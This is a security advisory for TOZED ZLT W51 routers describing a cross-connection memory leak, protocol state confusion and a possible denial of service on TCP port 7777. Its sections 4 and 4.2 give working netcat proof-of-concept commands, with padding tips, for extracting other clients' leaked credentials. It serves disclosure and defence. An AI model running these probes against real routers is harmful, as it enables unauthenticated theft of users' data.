# TOZED ZLT W51 Router Security Vulnerabilities

## 1. Basic Information

| Field | Value |
|---|---|
| **Vulnerability Type** | Information Disclosure, Memory Corruption , Denial of Service |
| **Affected Product** | TOZED ZLT W51 Router |
| **Affected Version** | Firmware up to 1.4.2 |

## 2. Executive Summary

Critical security vulnerabilities exist in the proprietary service (TCP port 7777) of TOZED ZLT W51 routers:

- **Cross-Connection Memory Disclosure**: Memory fragments from previous connections leak to new clients
- **Protocol State Confusion**: Improper state handling exposes additional memory contents
- **Denial of Service**: Extended exploitation causes service hang
  
<p align="center">
<img width="905" alt="{C784B12A-B9DA-4868-93B8-49C611D131B9}" src="https://github.com/user-attachments/assets/5870ca4f-17bd-429b-8d6c-826d4d11b254" />
</p>

## 3. Technical Details

### 3.1. Cross-Connection Memory Disclosure

When a client disconnects, server-side buffers aren't properly sanitized. Subsequent connections receive fragments of previous clients' data (usernames, passwords, tokens).

**Leak Mechanism:**
1. Attacker sends specially crafted version bytes:
   ```
   \x05\xff\x00
   \x05\x06\x00\x01... + padding until the entire buffer is leaked.
   ```
2. By varying padding bytes, attacker shifts the "leak window" through memory.

### 3.2. Protocol State Confusion Vulnerability

The router improperly handles protocol state transitions. Sending different command sequences in a single connection triggers confusion, causing:
- Memory leaks between protocol transitions
- Concatenated responses with mixed protocol headers
- Additional sensitive data exposure

### 3.3. Denial of Service Impact

An isolated service hang requiring device restart was also observed during extended memory leak exploitation, pointing to potential underlying memory corruption, although this specific crash was not consistently replicated.

### 4. Cross-Connection Memory Leak Validation

Use the following commands to confirm and quantify the buffer-residue leakage. Adjust the padding length to slide the "leak window" deeper into the stale memory region.

```bash
# Initial leak probe: triggers a small disclosure window
echo -e "\x05\xff\x00" | nc -N -w 1 192.168.0.1 7777 | xxd -g 1
```

```bash
# Extended leak probe: append N null bytes to shift the leak offset
echo -e "\x05\x06\x00\x01\x00\x00\x00\x00\x00" | nc -N -w 1 192.168.0.1 7777 | xxd -g 1
```

- **`-N`**: immediately close the write side after EOF  
- **`-w1`**: 1 second timeout to capture the server's response  
- **`xxd -g1`**: hexdump grouped by single bytes for precise inspection  

Adjust the number of trailing null bytes `\x00` to any desired padding length to iterate through successive buffer offsets.  

## 4.1. Proof of Concept

A video demonstration of the Cross-Connection Memory Disclosure vulnerability is available at:

https://github.com/user-attachments/assets/83561d25-8497-4051-bc54-301b3c2fb3f4

### 4.2 Protocol State Confusion Testing Command
```bash
(echo -e "\x05\x01\x00"; sleep 0.5; echo -e "\x04\x01\x00\x50\x08\x08\x08\x08") | nc -N -w 2 192.168.0.1 7777 | xxd -g 1
```

**Expected Results:** Response contains mixed protocol states with memory fragments from previous connections embedded between them.

![image](https://github.com/user-attachments/assets/d97b61dc-ec90-4a6d-89fa-625f0ba2b138)

Looping this for a while we start to see more garbage leaked:

![image](https://github.com/user-attachments/assets/0c29ff3c-bddc-4352-9cdf-a8b0503982fb)

An unauthenticated attacker can exploit these vulnerabilities without any credentials or prior access. In this testing exploitation occurs from the same network, the vulnerability can be exploited remotely across the internet if port 7777 is exposed through firewall rules or port forwarding configurations which will depend on how the ISP has setup the router. This allows attackers to extract sensitive data fragments and potentially disrupt service availability without requiring any authentication whatsoever.

## 5. CWE Classifications

| CWE ID | Name | Description |
|---|---|---|
| **CWE-244** | Improper Clearing of Heap Memory Before Release | Memory buffers are not cleared between connections |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | Previous connection data leaks to new clients |

## 6. Mitigations

- Disable service on TCP port 7777 if not required (this is not possible on user end on some ISP routers)
- Implement network access controls to restrict port access
- Monitor for exploitation attempts

## 7. Timeline

**Discovery:** 2025-04-10

**CNA Report Date:** 2025-05-01

## 8. Credits

Discovered and reported by Mohamed Maatallah
